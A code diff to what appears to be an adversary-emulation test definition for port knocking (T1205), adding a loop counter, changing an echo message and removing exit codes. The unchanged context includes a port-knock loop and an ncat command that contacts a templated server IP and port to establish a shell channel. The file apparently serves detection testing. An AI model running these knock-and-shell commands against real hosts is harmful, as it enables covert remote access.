@@ -82,6 +82,7 @@ atomic_tests:
         then
             echo "We have been listening for $COUNTER seconds out of max #{max_listen_seconds} seconds"
         fi
+        ((COUNTER=COUNTER+1))
         sleep 1
       done
 
@@ -142,7 +143,7 @@ atomic_tests:
           echo "Knock $PORT"
           sleep 0.5
         done
-        echo -e "Anyone home?\n\n"
+        echo -e "Anyone home?  Knock $LOOP of max 5.\n\n"
 
         sleep 2
         cat <(echo 'echo Shell to host $HOSTNAME as user $USER successful.'  && sleep 1) | ncat #{server_ip} #{listening_port} > /tmp/t1205_client.dat 2> /dev/null
@@ -157,10 +158,8 @@ atomic_tests:
       if [ SHELL_CONTACTED ] ; then
         echo Shell successfully executed with port knock
         cat /tmp/t1205_client.dat
-        exit 0
       else
         echo Unable to bind shell with port knock
-        exit 1
       fi
     cleanup_command:
       rm -f /tmp/t1205_client.dat
